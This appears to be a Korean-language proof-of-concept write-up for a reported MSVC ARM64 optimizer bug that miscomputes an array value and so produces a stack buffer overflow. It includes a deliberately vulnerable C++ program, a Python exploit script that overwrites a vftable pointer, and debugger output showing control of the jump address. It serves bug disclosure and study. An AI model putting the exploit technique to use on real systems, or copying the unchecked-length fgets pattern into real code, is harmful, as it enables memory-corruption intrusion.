# PoC1: Stack Buffer Overflow

## Description

- **Type**: Stack Buffer Overflow
- **OS**: Microsoft Windows 11 23H2
- **Compiler**: MSVC CL (ARM64)
- **Compiler Version**: 19.38.33133 (ARM64)
- **Compiler Options**: Problematic: /O1, /O2, /Ox Normal: /Od, /Ot
- **Bug Behavior**: 이 PoC는 스택 버퍼 오버플로우를 시연합니다. 특정 입력에서 버퍼가 오버플로우되어 임의 코드 실행이 가능해집니다.
- **Reported Bug**: [Link to the reported bug](https://developercommunity.visualstudio.com/t/Incorrect-Assembly-Code-Generated-with-/10506096)

## Bug Demonstration Code

이 코드는 컴파일러 최적화 과정에서 발생하는 특이한 버그를 보여줍니다.

버퍼의 크기를 `홀수(13)`로 설정하고, 모든 요소를 동일한 값(13)으로 초기화하면 정상적으로는 마지막 요소의 값이 `0x0d`가 되어야 합니다. 
하지만, `특정 최적화 옵션(/O1, /O2, /Ox)`을 사용할 경우, 버그로 인해 버퍼의 `마지막 값이 0x0d0d`로 잘못 계산되는 현상이 발생합니다. 

이는 컴파일러 최적화가 변수의 값을 예상치 못한 방식으로 변경할 수 있음을 시사합니다.


```c
#include <stdio.h>

#define array_size 13 // odd number

void init(char* arr, int size) {
    for(int i = 0; i < size; i++) {
        arr[i] = array_size;
    }
}

int main(int argc, char *argv[]) {
    volatile int16_t buf_size = 0;
	char buffer[array_size];
    init(buffer, array_size);
    buf_size = buffer[array_size - 1]; // /O1, /O2, /Ox에서 큰수로 판단 0x0d0d
    printf("buf_size = %x\n", buf_size);
}

```
## PoC Code
이 PoC 코드는 Windows ARM64에서 /O1, /O2, /Ox 컴파일러 옵션에서만 발생하는 Stack Buffer Overflow 취약점을 시연합니다. 

핵심 원리는 홀수 크기(여기서는 13)의 배열을 동일한 상수(13)로 초기화할 때, 최적화 과정에서 버그가 발생하여 배열의 마지막 값을 큰 수(0x0d0d)로 잘못 계산하는 것입니다. 

이 버그를 이용해 생성된 buffer 배열의 크기가 실제보다 크게 판단되어, fgets 함수를 통해 버퍼 오버플로우가 발생하고 vftable을 overwrite할 수 있어 임의 코드 실행이 가능합니다.

이 PoC는 최적화 옵션에 따라 다르게 발생하는 취약점의 실제 영향을 보여주며, /Od, /Ot와 같이 최적화가 적용되지 않은 경우에는 취약점이 발생하지 않음을 보여줍니다.



```cpp
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define array_size 13 // odd number

class Foo {
    public:
    void init(char* arr, int size) {
        for(int i = 0; i < size; i++) {
            arr[i] = array_size;
        }
    }
// arr[0x0d]
// 0x0d 0x0d 0x0d 0x0d .. 0x0d 0x0d 0x0d 0x0d 

    void __declspec(noinline) dong() {
        volatile int16_t buf_size = 0;
        char buffer[array_size];
        init(buffer, array_size);
        buf_size = buffer[array_size - 1]; // /O1, /O2, /Ox에서 큰수로 판단 0x0d0d
    
        printf("bug val = 0x%p\n", &buf_size); // Need to Leak ! 여기서는 Leak이 되었다고 가정
        fflush(stdout);
        fgets(buffer, buf_size, stdin);

        printf("your_msg : %s\n", buffer);

        bar();
    }

    virtual void __declspec(noinline) bar() {
        printf("bar\n");
    }
};


int main(int argc, char *argv[]) {
    Foo foo;
    foo.dong();
    return 0;
}
```
## Exploit Script

```python
import subprocess
import sys
import struct
import re

def p32(num):
    return struct.pack('<I', num)

def p64(num):
    return struct.pack('<Q', num)

def get_addr(line):
    hex_values = re.findall(b'0x[0-9A-Fa-f]+', line)
    return int(hex_values[0], 16)

pe_binary = ""

args = sys.argv[1:]

if len(args) == 0:
    print("please input target binary")
    exit(1)
else:
    pe_binary = args[0]

# 자식 프로세스 실행
proc = subprocess.Popen([pe_binary],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)

payload = b''

vftable_offset = 16
leak_stack_addr = proc.stdout.readline()

leak_stack_addr = get_addr(leak_stack_addr)
print("leak_stack_addr ", hex(leak_stack_addr))

payload += b"A"*8
payload += b'B'*8 # 여기로 점프함
payload += b"C"*8
payload += b'D'*8
payload += b"E"*8


new_vftable_addr = p64(leak_stack_addr + vftable_offset)
print(new_vftable_addr)
payload += new_vftable_addr

proc.stdin.write(payload + b"\n")
proc.stdin.flush()

response = proc.stdout.read()
print(response)
```

## Result
이 PoC 코드의 실행 결과는 컴파일러 최적화 옵션에 따라 다릅니다. 특히 /O1, /O2, /Ox 옵션에서 취약한 바이너리가 생성되며, 이를 통해 스택 버퍼 오버플로우가 발생합니다.

### /O1, /O2, /Ox : 최적화로 인해 취약한 바이너리
/O1, /O2, /Ox 옵션을 사용할 때, 버그는 스택 버퍼 오버플로우를 유발하여 프로그램이 예상치 못한 동작을 하게 됩니다. 

아래는 실행 결과 예시입니다:
```
c:\Users\armbob\Desktop\small>python ex.py .\out\small_O1.exe
leak_stack_addr  0x97abfefa50
b'`\xfa\xfe\xab\x97\x00\x00\x00'
...Crash....
```
디버그 정보:
```
0:000> kp
 # Child-SP          RetAddr               Call Site
00 000000a3`3477edd0 00007ff7`6bff1420     small_O1!__report_gsfailure(unsigned int64 stack_cookie = 0xbcbcbd5f`f134b58d)+0xc [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\gs\gs_report.c @ 207] 
01 000000a3`3477ede0 00007ff7`6bffb29c     small_O1!__gsfailure(void)+0x28 [D:\a\_work\1\s\Intermediate\crt\vcstartup\build\mt\libcmt_kernel32\libcmt_kernel32.nativeproj\objr\arm64\arm64secgs.i @ 4137] 
02 (Inline Function) --------`--------     small_O1!__GSHandlerCheckCommon(void)+0x1c [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\gs\arm64\gshandler.cpp @ 157] 
03 000000a3`3477ee00 00007ffb`04e32894     small_O1!__GSHandlerCheck(struct _EXCEPTION_RECORD * ExceptionRecord = <Value unavailable error>, void * EstablisherFrame = <Value unavailable error>, struct _CONTEXT * ContextRecord = <Value unavailable error>, struct _DISPATCHER_CONTEXT * DispatcherContext = <Value unavailable error>)+0x2c [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\gs\arm64\gshandler.cpp @ 77] 
04 000000a3`3477ee10 00007ffb`04ea23a8     ntdll!RtlpExecuteHandlerForException+0x14
05 000000a3`3477ee30 00007ffb`04e32764     ntdll!RtlDispatchException+0x200
06 000000a3`3477f470 42424242`42424242     ntdll!KiUserExceptionDispatch+0x24
07 000000a3`3477f8c0 00007ff7`6bffafb0     0x42424242`42424242 ; 임의주소 점프
08 000000a3`3477f8c0 45454545`45454545     small_O1!Foo::dong(void)+0x80 [C:\Users\armbob\Desktop\small\small.cpp @ 28] 
09 000000a3`3477f8f0 00000000`00000000     0x45454545`45454545
```
### /Od, /Ot : 최적화 되지 않아 버그가 발생하지 않는 바이너리
/Od, /Ot와 같이 최적화가 적용되지 않은 경우에는 버그가 발생하지 않아 취약점이 발생하지 않습니다. 

실행 결과는 정상적으로 보여집니다:

```
c:\Users\armbob\Desktop\small>python ex.py .\out\small_Od.exe
leak_stack_addr  0x99e0f3fbb0
b'\xc0\xfb\xf3\xe0\x99\x00\x00\x00'
b'your_msg : AAAAAAAABBBB\r\nbar\r\n'

c:\Users\armbob\Desktop\small>python ex.py .\out\small_Ot.exe
leak_stack_addr  0xe27b6ffa10
b' \xfao{\xe2\x00\x00\x00'
b'your_msg : AAAAAAAABBBB\r\nbar\r\n'
```